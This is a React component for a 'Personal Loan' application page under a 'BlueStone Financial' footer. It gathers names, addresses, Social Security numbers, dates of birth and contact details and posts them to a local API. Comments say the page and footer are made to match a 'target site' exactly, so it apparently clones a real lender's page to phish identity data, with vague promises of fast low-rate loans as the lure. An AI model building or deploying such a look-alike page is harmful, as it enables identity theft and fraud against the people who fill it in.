import Header from "@/components/Header";
import { useNavigate, useParams } from "react-router-dom";
import { useState } from "react";

const ApplyLoan = () => {
  const navigate = useNavigate();
  const { type } = useParams();
  
  // Format the loan type for display
  const title = "Personal Loan"; // Hardcoded to match the target site exactly
  
  const [isSubmitting, setIsSubmitting] = useState(false);

  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    setIsSubmitting(true);
    const formData = new FormData(e.currentTarget);
    const data = Object.fromEntries(formData);
    data.formType = "Loan Application";

    try {
      const response = await fetch("/api/submit-form", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data)
      });
      if (response.ok) {
        alert("Application submitted successfully. We will review your details and contact you shortly.");
        navigate("/");
      } else {
        alert("There was an error submitting your form. Please try again.");
      }
    } catch (err) {
      alert("Network error. Could not submit.");
    } finally {
      setIsSubmitting(false);
    }
  };

  const handlePhoneFormat = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, '').slice(0, 10);
    let formatted = '';
    if (value.length > 0) formatted = value.slice(0, 3);
    if (value.length >= 4) formatted += '-' + value.slice(3, 6);
    if (value.length >= 7) formatted += '-' + value.slice(6, 10);
    e.target.value = formatted;
  };

  const handleSsnFormat = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, '').slice(0, 9);
    let formatted = '';
    if (value.length > 0) formatted = value.slice(0, 3);
    if (value.length >= 4) formatted += '-' + value.slice(3, 5);
    if (value.length >= 6) formatted += '-' + value.slice(5, 9);
    e.target.value = formatted;
  };

  const handleZipFormat = (e: React.ChangeEvent<HTMLInputElement>) => {
    e.target.value = e.target.value.replace(/[^0-9]/g, '').slice(0, 5);
  };

  return (
    <div className="min-h-screen flex flex-col bg-white text-gray-800" style={{ fontFamily: "Arial, sans-serif" }}>
      <Header />
      
      <main className="flex-grow pb-24 pt-16">
        <div className="container mx-auto px-4 max-w-4xl">
          
          <div className="mb-12">
            <h1 className="text-gray-900 mb-6" style={{ fontSize: "52px", fontWeight: 400 }}>
              Apply Now
            </h1>
            <p className="mb-4 text-gray-800" style={{ fontSize: "24px" }}>{title}</p>
            <p className="mb-4 text-gray-800" style={{ fontSize: "16px" }}>Get up to $10,000 with a low, fixed rate loan</p>
            <ul className="list-disc pl-6 space-y-2 mb-12 text-gray-800" style={{ fontSize: "16px" }}>
              <li>Affordable monthly payments</li>
              <li>Enjoy the benefits of No Prepayment fees with affiliated banks, making it easier for you to manage your finances.</li>
              <li>Experience fast funding that gets you the support you need without the wait!</li>
            </ul>
          </div>

          <form onSubmit={handleSubmit} className="space-y-6">
            <div className="grid grid-cols-1 md:grid-cols-2 gap-x-8 gap-y-6">
              
              <div className="w-full">
                  <label className="block text-gray-700 mb-2" style={{ fontSize: "20px" }}>First Name*</label>
                  <input 
                    type="text" 
                    name="First Name" 
                    placeholder="Your Name" 
                    required 
                    className="w-full px-4 py-3 border border-gray-300 rounded focus:outline-none focus:border-blue-500"
                  />
              </div>

              <div className="w-full">
                  <label className="block text-gray-700 mb-2" style={{ fontSize: "20px" }}>Last Name*</label>
                  <input 
                    type="text" 
                    name="Last Name" 
                    placeholder="Your Last Name" 
                    className="w-full px-4 py-3 border border-gray-300 rounded focus:outline-none focus:border-blue-500"
                  />
              </div>

              <div className="w-full">
                  <label className="block text-gray-700 mb-2" style={{ fontSize: "20px" }}>Street Address*</label>
                  <input 
                    type="text" 
                    name="Street Address" 
                    placeholder="Enter Your Street Address" 
                    className="w-full px-4 py-3 border border-gray-300 rounded focus:outline-none focus:border-blue-500"
                  />
              </div>

              <div className="w-full">
                  <label className="block text-gray-700 mb-2" style={{ fontSize: "20px" }}>Street Address Line 2*</label>
                  <input 
                    type="text" 
                    name="Street Address Line 2" 
                    placeholder="Enter Your Street Address 2" 
                    className="w-full px-4 py-3 border border-gray-300 rounded focus:outline-none focus:border-blue-500"
                  />
              </div>

              <div className="w-full">
                  <label className="block text-gray-700 mb-2" style={{ fontSize: "20px" }}>City*</label>
                  <input 
                    type="text" 
                    name="City" 
                    placeholder="Enter Your City" 
                    required 
                    className="w-full px-4 py-3 border border-gray-300 rounded focus:outline-none focus:border-blue-500"
                  />
              </div>

              <div className="w-full">
                  <label className="block text-gray-700 mb-2" style={{ fontSize: "20px" }}>State*</label>
                  <input 
                    type="text" 
                    name="State" 
                    placeholder="Enter Your State" 
                    required 
                    className="w-full px-4 py-3 border border-gray-300 rounded focus:outline-none focus:border-blue-500"
                  />
              </div>

              <div className="w-full">
                  <label className="block text-gray-700 mb-2" style={{ fontSize: "20px" }}>Zip code*</label>
                  <input 
                    type="text" 
                    name="Zip code" 
                    placeholder="Enter Your Zip code" 
                    required 
                    maxLength={5}
                    onInput={handleZipFormat}
                    className="w-full px-4 py-3 border border-gray-300 rounded focus:outline-none focus:border-blue-500"
                  />
              </div>

              <div className="w-full">
                  <label className="block text-gray-700 mb-2" style={{ fontSize: "20px" }}>Social Security Number*</label>
                  <input 
                    type="text" 
                    name="Social Security Number" 
                    placeholder="Enter Your Security Number" 
                    required 
                    maxLength={11}
                    onInput={handleSsnFormat}
                    className="w-full px-4 py-3 border border-gray-300 rounded focus:outline-none focus:border-blue-500"
                  />
              </div>

              <div className="w-full">
                  <label className="block text-gray-700 mb-2" style={{ fontSize: "20px" }}>Date of Birth*</label>
                  <input 
                    type="date" 
                    name="dob" 
                    placeholder="Enter Your Date of Birth" 
                    required 
                    className="w-full px-4 py-3 border border-gray-300 rounded focus:outline-none focus:border-blue-500"
                  />
              </div>

              <div className="w-full">
                  <label className="block text-gray-700 mb-2" style={{ fontSize: "20px" }}>Email Address*</label>
                  <input 
                    type="email" 
                    name="Email Address" 
                    placeholder="Enter your Email" 
                    required 
                    className="w-full px-4 py-3 border border-gray-300 rounded focus:outline-none focus:border-blue-500"
                  />
              </div>

              <div className="w-full">
                  <label className="block text-gray-700 mb-2" style={{ fontSize: "20px" }}>Phone*</label>
                  <input 
                    type="text" 
                    id="phone" 
                    name="Phone" 
                    placeholder="741-746-8547" 
                    required 
                    maxLength={12}
                    onInput={handlePhoneFormat}
                    pattern="\d{3}-\d{3}-\d{4}"
                    title="Format: 741-746-8547"
                    className="w-full px-4 py-3 border border-gray-300 rounded focus:outline-none focus:border-blue-500"
                  />
              </div>

              <div className="w-full">
                  <label className="block text-gray-700 mb-2" style={{ fontSize: "20px" }}>Loan Amount*</label>
                  <input 
                    type="text" 
                    name="Loan Amount" 
                    placeholder="Enter Loan Amount (e.g. 5000)" 
                    required 
                    className="w-full px-4 py-3 border border-gray-300 rounded focus:outline-none focus:border-blue-500 bg-white"
                  />
              </div>

            </div>

            <div className="pt-6">
              <button 
                type="submit" 
                disabled={isSubmitting}
                className="inline-block px-12 py-3 rounded text-white font-medium hover:opacity-90 transition-opacity disabled:opacity-50"
                style={{ background: "#0b5ed7", fontSize: "18px", width: "100%", maxWidth: "200px" }}
              >
                {isSubmitting ? "Submitting..." : "Apply"}
              </button>
            </div>
          </form>

        </div>
      </main>

      {/* Simple Black Footer matching target site */}
      <footer className="bg-black py-12 mt-auto">
        <div className="container mx-auto px-4">
           <div className="text-center text-white/80" style={{ fontSize: "15px" }}>
             Copyright © 2004-2026, BlueStone Financial, All Rights Reserved.
           </div>
        </div>
      </footer>
    </div>
  );
};

export default ApplyLoan;
